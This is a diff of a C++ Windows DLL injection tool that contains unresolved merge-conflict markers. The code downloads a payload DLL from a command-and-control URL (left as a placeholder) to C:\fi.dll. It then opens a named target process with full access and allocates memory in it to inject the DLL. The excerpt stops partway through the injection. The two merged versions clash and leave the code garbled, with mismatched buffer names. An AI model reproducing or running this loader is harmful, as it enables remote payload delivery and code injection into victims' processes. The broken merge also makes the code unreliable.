@@ -11,7 +11,11 @@
 #define _CRT_SECURE_NO_WARNINGS
 using namespace std;
 
+<<<<<<< HEAD
 //A simple DLL injection example
+=======
+//A simple remote DLL injection example
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 
 void GetPayload() {
 	char* fBuffer = NULL;
@@ -24,6 +28,7 @@ void GetPayload() {
 		std::cerr << "error could not open handle to user agent: " << GetLastErrorAsString();
 	}
 	else {
+<<<<<<< HEAD
 		//if using not relative url use InternetCanonicalizeUrl
 		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "", 0, 0, INTERNET_FLAG_RELOAD, 0);
 		if (iOpen == NULL) {
@@ -32,11 +37,22 @@ void GetPayload() {
 		else {
 			//create empty file on disk
 			HANDLE hOut = CreateFile(L"C:\\testDll.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+=======
+		//fetch the payload from the c2 get a handle to the resource. if using not relative url use InternetCanonicalizeUrl
+		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "<url_path_to_remote_dll>", 0, 0, INTERNET_FLAG_RELOAD, 0);
+		if (iRsrc == NULL) {
+			std::cerr << "could not access resource: " << GetLastErrorAsString();
+		}
+		else {
+			//get a handle to the file to be created on disk. the payload will be stored on the root of the C:\ drive. 
+			HANDLE hOut = CreateFile(L"C:\\fi.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 			if (hOut == INVALID_HANDLE_VALUE) {
 				cerr << "could not create file: " << GetLastErrorAsString() << endl;
 			}
 			else {
 				do {
+<<<<<<< HEAD
 					fBuffer = new char[2000];
 					ZeroMemory(fBuffer, 2000);
 					//read the file from the url
@@ -53,6 +69,15 @@ void GetPayload() {
 					//clean up. free memory and close handles
 					delete[] fBuffer;
 					fBuffer = NULL;
+=======
+					//read and write the file to a location on disk 
+					lpBuffer = new char[2000];
+					ZeroMemory(lpBuffer, 2000);
+						InternetReadFile(iRsrc, (LPVOID)lpBuffer, 2000, &numberOfBytesRead);
+						WriteFile(hOut, &lpBuffer[0], numberOfBytesRead, &nnumberBytesWritten, NULL);
+					delete[] lpBuffer;
+					lpBuffer = NULL;
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 				} while (numberOfBytesRead);
 				CloseHandle(hOut);
 			}
@@ -65,9 +90,15 @@ void GetPayload() {
 
 int executePayload() {
 	WIN32_FIND_DATAA fdata;
+<<<<<<< HEAD
 	//get a handle to the file created
 	HANDLE findFile = FindFirstFileA("C:\\testDll.dll", &fdata);
 
+=======
+	
+	//validate the payload was sucessfully downloaded
+	HANDLE findFile = FindFirstFileA("C:\\fi.dll", &fdata);
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 	if (findFile == INVALID_HANDLE_VALUE) {
 		cerr << "Could not find fild data" << GetLastErrorAsString();
 	}
@@ -75,7 +106,12 @@ int executePayload() {
 		std::string pname, dllpath;
 		PROCESS_ACTIONS::ProcActions<DWORD> obj;
 
+<<<<<<< HEAD
 		const char* p = ""; const char* d = "C:\\testDll.dll";
+=======
+		//specifiy the name of the app to be targeted and path of the dll.
+		const char* p = "<app_name_here>"; const char* d = "C:\\fi.dll";
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 		if (obj.getProcessIDbyName(p) == 0) {
 			cerr << "[ERROR] The process specified was not found." << std::endl;
 			
@@ -85,13 +121,21 @@ int executePayload() {
 			cerr << "\n[ERROR] Invalid file path specified." << endl;
 		}
 		else {
+<<<<<<< HEAD
 			//open a handle to the target process
+=======
+			//open a handle to the process specified
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, obj.getProcessIDbyName(p));
 			if (hProcess == NULL) {
 				cerr << "Could not open process" << GetLastErrorAsString();
 			}
 			else {
+<<<<<<< HEAD
 				//allocate memory in process, save base address
+=======
+
+>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
 				LPVOID dllP = VirtualAllocEx(hProcess, 0, strlen(d) + 1, MEM_COMMIT, PAGE_READWRITE);
 				if (dllP == NULL) {
 					cerr << "Failed to allocate memory in process. " << GetLastErrorAsString() << endl;
